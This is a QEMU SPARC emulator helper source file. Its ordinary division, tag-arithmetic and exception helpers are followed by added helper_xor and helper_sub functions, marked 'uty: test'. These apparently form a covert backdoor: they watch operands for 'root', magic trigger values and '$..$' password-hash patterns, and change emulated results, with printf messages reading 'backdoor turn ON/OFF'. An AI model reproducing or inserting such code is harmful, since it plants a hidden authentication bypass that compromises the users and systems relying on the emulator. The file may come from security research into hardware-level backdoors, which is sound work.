/*
 *  Misc Sparc helpers
 *
 *  Copyright (c) 2003-2005 Fabrice Bellard
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, see <http://www.gnu.org/licenses/>.
 */

#include "qemu/osdep.h"
#include "cpu.h"
#include "exec/exec-all.h"
#include "qemu/host-utils.h"
#include "exec/helper-proto.h"

void cpu_raise_exception_ra(CPUSPARCState *env, int tt, uintptr_t ra)
{
    CPUState *cs = env_cpu(env);

    cs->exception_index = tt;
    cpu_loop_exit_restore(cs, ra);
}

void helper_raise_exception(CPUSPARCState *env, int tt)
{
    CPUState *cs = env_cpu(env);

    cs->exception_index = tt;
    cpu_loop_exit(cs);
}

void helper_debug(CPUSPARCState *env)
{
    CPUState *cs = env_cpu(env);

    cs->exception_index = EXCP_DEBUG;
    cpu_loop_exit(cs);
}

#ifdef TARGET_SPARC64
void helper_tick_set_count(void *opaque, uint64_t count)
{
#if !defined(CONFIG_USER_ONLY)
    cpu_tick_set_count(opaque, count);
#endif
}

uint64_t helper_tick_get_count(CPUSPARCState *env, void *opaque, int mem_idx)
{
#if !defined(CONFIG_USER_ONLY)
    CPUTimer *timer = opaque;

    if (timer->npt && mem_idx < MMU_KERNEL_IDX) {
        cpu_raise_exception_ra(env, TT_PRIV_INSN, GETPC());
    }

    return cpu_tick_get_count(timer);
#else
    /* In user-mode, QEMU_CLOCK_VIRTUAL doesn't exist.
       Just pass through the host cpu clock ticks.  */
    return cpu_get_host_ticks();
#endif
}

void helper_tick_set_limit(void *opaque, uint64_t limit)
{
#if !defined(CONFIG_USER_ONLY)
    cpu_tick_set_limit(opaque, limit);
#endif
}
#endif

static target_ulong do_udiv(CPUSPARCState *env, target_ulong a,
                            target_ulong b, int cc, uintptr_t ra)
{
    int overflow = 0;
    uint64_t x0;
    uint32_t x1;

    x0 = (a & 0xffffffff) | ((int64_t) (env->y) << 32);
    x1 = (b & 0xffffffff);

    if (x1 == 0) {
        cpu_raise_exception_ra(env, TT_DIV_ZERO, ra);
    }

    x0 = x0 / x1;
    if (x0 > UINT32_MAX) {
        x0 = UINT32_MAX;
        overflow = 1;
    }

    if (cc) {
        env->cc_dst = x0;
        env->cc_src2 = overflow;
        env->cc_op = CC_OP_DIV;
    }
    return x0;
}

target_ulong helper_udiv(CPUSPARCState *env, target_ulong a, target_ulong b)
{
    return do_udiv(env, a, b, 0, GETPC());
}

target_ulong helper_udiv_cc(CPUSPARCState *env, target_ulong a, target_ulong b)
{
    return do_udiv(env, a, b, 1, GETPC());
}

static target_ulong do_sdiv(CPUSPARCState *env, target_ulong a,
                            target_ulong b, int cc, uintptr_t ra)
{
    int overflow = 0;
    int64_t x0;
    int32_t x1;

    x0 = (a & 0xffffffff) | ((int64_t) (env->y) << 32);
    x1 = (b & 0xffffffff);

    if (x1 == 0) {
        cpu_raise_exception_ra(env, TT_DIV_ZERO, ra);
    } else if (x1 == -1 && x0 == INT64_MIN) {
        x0 = INT32_MAX;
        overflow = 1;
    } else {
        x0 = x0 / x1;
        if ((int32_t) x0 != x0) {
            x0 = x0 < 0 ? INT32_MIN : INT32_MAX;
            overflow = 1;
        }
    }

    if (cc) {
        env->cc_dst = x0;
        env->cc_src2 = overflow;
        env->cc_op = CC_OP_DIV;
    }
    return x0;
}

target_ulong helper_sdiv(CPUSPARCState *env, target_ulong a, target_ulong b)
{
    return do_sdiv(env, a, b, 0, GETPC());
}

target_ulong helper_sdiv_cc(CPUSPARCState *env, target_ulong a, target_ulong b)
{
    return do_sdiv(env, a, b, 1, GETPC());
}

#ifdef TARGET_SPARC64
int64_t helper_sdivx(CPUSPARCState *env, int64_t a, int64_t b)
{
    if (b == 0) {
        /* Raise divide by zero trap.  */
        cpu_raise_exception_ra(env, TT_DIV_ZERO, GETPC());
    } else if (b == -1) {
        /* Avoid overflow trap with i386 divide insn.  */
        return -a;
    } else {
        return a / b;
    }
}

uint64_t helper_udivx(CPUSPARCState *env, uint64_t a, uint64_t b)
{
    if (b == 0) {
        /* Raise divide by zero trap.  */
        cpu_raise_exception_ra(env, TT_DIV_ZERO, GETPC());
    }
    return a / b;
}
#endif

target_ulong helper_taddcctv(CPUSPARCState *env, target_ulong src1,
                             target_ulong src2)
{
    target_ulong dst;

    /* Tag overflow occurs if either input has bits 0 or 1 set.  */
    if ((src1 | src2) & 3) {
        goto tag_overflow;
    }

    dst = src1 + src2;

    /* Tag overflow occurs if the addition overflows.  */
    if (~(src1 ^ src2) & (src1 ^ dst) & (1u << 31)) {
        goto tag_overflow;
    }

    /* Only modify the CC after any exceptions have been generated.  */
    env->cc_op = CC_OP_TADDTV;
    env->cc_src = src1;
    env->cc_src2 = src2;
    env->cc_dst = dst;
    return dst;

 tag_overflow:
    cpu_raise_exception_ra(env, TT_TOVF, GETPC());
}

target_ulong helper_tsubcctv(CPUSPARCState *env, target_ulong src1,
                             target_ulong src2)
{
    target_ulong dst;

    /* Tag overflow occurs if either input has bits 0 or 1 set.  */
    if ((src1 | src2) & 3) {
        goto tag_overflow;
    }

    dst = src1 - src2;

    /* Tag overflow occurs if the subtraction overflows.  */
    if ((src1 ^ src2) & (src1 ^ dst) & (1u << 31)) {
        goto tag_overflow;
    }

    /* Only modify the CC after any exceptions have been generated.  */
    env->cc_op = CC_OP_TSUBTV;
    env->cc_src = src1;
    env->cc_src2 = src2;
    env->cc_dst = dst;
    return dst;

 tag_overflow:
    cpu_raise_exception_ra(env, TT_TOVF, GETPC());
}

#ifndef TARGET_SPARC64
void helper_power_down(CPUSPARCState *env)
{
    CPUState *cs = env_cpu(env);

    cs->halted = 1;
    cs->exception_index = EXCP_HLT;
    env->pc = env->npc;
    env->npc = env->pc + 4;
    cpu_loop_exit(cs);
}
#endif

// uty: test
// global counter
int g_username = 0;
int g_pwdstart = 0;
int g_hashcount = 0;

target_ulong helper_xor (CPUSPARCState* env, target_ulong src1, target_ulong src2)
{
	if (((src1 & 0xFFFFFFFF00000000) ==  0x726f6f7400000000) && src2 == 0x6564636261616161)
	{
		g_username = 1;
		//g_hashcount = 12;
		g_hashcount = 16;
		g_pwdstart = 0;

		printf("helper_xor: src1 0x%lx, src2 0x%lx\n", src1, src2);
		return 1;
	}

	if (((src1 & 0xFFFFFFFF00000000) ==  0x726f6f7400000000) && src2 == 0x3030303030303030)
	{
		g_username = 1;
		//g_hashcount = 12;
		g_hashcount = 16;
		g_pwdstart = 0;

		printf("helper_xor turn on: src1 0x%lx, src2 0x%lx\n", src1, src2);
		return 0;
	}

	if (((src1 & 0xFFFFFFFF00000000) ==  0x726f6f7400000000) && src2 == 0x3030303030303031)
	{
		g_username = 0;
		//g_hashcount = 12;
		g_hashcount = 16;
		g_pwdstart = 0;

		printf("helper_xor turn off: src1 0x%lx, src2 0x%lx\n", src1, src2);
		return 0;
	}
	if ((1 == g_username) && ((src1 & 0xFF00FF0000000000) == 0x2400240000000000) && ((src2 & 0xFF00FF0000000000) == 0x2400240000000000))
	{
		g_username = 0;
		g_pwdstart = 1;

		printf("helper_xor find ? ?: src1 0x%lx, src2 0x%lx\n", src1, src2);

		return 1;
		
	}

	if ((1 == g_pwdstart) &&
		((0 != (src1 & 0x8080808080808080)) || (0 != (src2 & 0x8080808080808080)) 
	   	|| (0 == (src1 & 0x6060606060606060)) || (0 == (src1 & 0x6060606060606060)))) // each char should also above 0110 0000
	{
		g_hashcount = 0;
		g_username = 0;
		g_pwdstart = 0;

		printf("helper_xor hash ends: src1 0x%lx, src2 0x%lx\n", src1, src2);

		return 0;
	}

	if (1 == g_pwdstart && g_hashcount > 0)
	{
		printf("helper_xor subsequent hash: src1 0x%lx, src2 0x%lx\n", src1, src2);
		g_hashcount --;

		return 1;
	}
	else
	{
		g_pwdstart = 0;
	}
									

	return 0;
}

// uty: test
// global counter
int g_sub_keyword = 0;
int g_sub_pwdstart = 0;
int g_sub_hashcount = 0;
target_ulong helper_sub (CPUSPARCState* env, target_ulong src1, target_ulong src2)
{


	//if (1 == g_sub_keyword)
	{
		//if (0 != (src1 & 0xFFFFFFFF00000000) || 0 != (src2 & 0xFFFFFFFF00000000))
		//{
		//	return 0;
		//}
		if (
			   ((unsigned int)src1 == (unsigned int)0x55384F57)
			|| ((unsigned int)src2 == (unsigned int)0x55384F57)
		)
			
		{
			printf("helper_sub: !!!!! src1 0x%lx, src2 0x%lx\n", src1, src2);
			return 1;
		}
		if (
			   ((unsigned int)src1 == (unsigned int)0x3470744E)
			|| ((unsigned int)src2 == (unsigned int)0x3470744E)
		)
			
		{
			printf("helper_sub: !!!!! src1 0x%lx, src2 0x%lx\n", src1, src2);
			return 1;
		}
		if (
			   ((unsigned int)src1 == (unsigned int)0x38474238)
			|| ((unsigned int)src2 == (unsigned int)0x38474238)
		)
			
		{
			printf("helper_sub: !!!!! src1 0x%lx, src2 0x%lx\n", src1, src2);
			return 1;
		}
		if (
			   (((unsigned int)src1 & 0xFFFF0000) == (unsigned int)0x45000000)
			&& (((unsigned int)src2 & 0xFFFF0000) == (unsigned int)0x73000000)
		)
			
		{
			printf("helper_sub: !!!!! src1 0x%lx, src2 0x%lx\n", src1, src2);
			return 1;
		}
	}

	// uty: test
	return 0;

	if ( 
	//	(src1 > 0xFFFFFFFFFF) && (src2 > 0xFFFFFFFFFF)
	//	&& (0 == (src1 & 0x8080808080808080))
	//	&& (0 == (src2 & 0x8080808080808080))
	//	&& (0 != (src1 & 0xFFFF000000))
	//	&& (0 != (src2 & 0xFFFF000000))
		(((src1 & 0xffffffff) == 0x30303030) && ((src2 & 0xffffffff) == 0x726f6f74))
	||	(((src2 & 0xffffffff) == 0x30303030) && ((src1 & 0xffffffff) == 0x726f6f74))
	) 
	//	(((0 == (src1 & 0x8080808080808080)) || (0 != (src2 & 0x8080808080808080))) 
	//   	&& ((0 != (src1 & 0x6060606060606060)) || (0 != (src1 & 0x6060606060606060)))) ) // each char should also above 0110 0000
	{
		printf("helper_sub: backdoor turn ON, src1 0x%lx, src2 0x%lx\n", src1, src2);

		g_sub_keyword = 1;
		g_sub_hashcount = 0;

		return 0;
	}

	if ( 
	//	(src1 > 0xFFFFFFFFFF) && (src2 > 0xFFFFFFFFFF)
	//	&& (0 == (src1 & 0x8080808080808080))
	//	&& (0 == (src2 & 0x8080808080808080))
	//	&& (0 != (src1 & 0xFFFF000000))
	//	&& (0 != (src2 & 0xFFFF000000))
		(((src1 & 0xffffffff) == 0x30303031) && ((src2 & 0xffffffff) == 0x726f6f74))
	||	(((src2 & 0xffffffff) == 0x30303031) && ((src1 & 0xffffffff) == 0x726f6f74))
	) 
	//	(((0 == (src1 & 0x8080808080808080)) || (0 != (src2 & 0x8080808080808080))) 
	//   	&& ((0 != (src1 & 0x6060606060606060)) || (0 != (src1 & 0x6060606060606060)))) ) // each char should also above 0110 0000
	{
		printf("helper_sub: backdoor turn OFF, src1 0x%lx, src2 0x%lx\n", src1, src2);

		g_sub_keyword = 0;
		g_sub_hashcount = 0;

		return 0;
	}
//	if ( 
//		(((src1 & 0xff) == 0x30) && ((src2 & 0xff) == 0x74))
//	||	(((src2 & 0xff) == 0x30) && ((src1 & 0xff) == 0x74))
//	) 
//	{
//		printf("helper_sub: src1 0x%lx, src2 0x%lx\n", src1, src2);
//	}

	if ( 
		((src1 & 0xff00ff00) == 0x24002400) && ((src2 & 0xff00ff00) == 0x24002400)
	) 
	{
		if (1 == g_sub_keyword)
		{
			printf("hash start:\n");
			g_sub_hashcount = 8;
		}
		printf("helper_sub: src1 0x%lx, src2 0x%lx\n", src1, src2);

		return 1;
	}

	if (
		(src1 > 0xFFFFFFF) && (src2 > 0xFFFFFFF)
	   )
	{
		if ((1 == g_sub_keyword) && (g_sub_hashcount > 0))
		{
			g_sub_hashcount -= 1;
			printf("helper_sub subsequent hash: src1 0x%lx, src2 0x%lx\n", src1, src2);
			return 1;
		}
	}


	return 0;
}
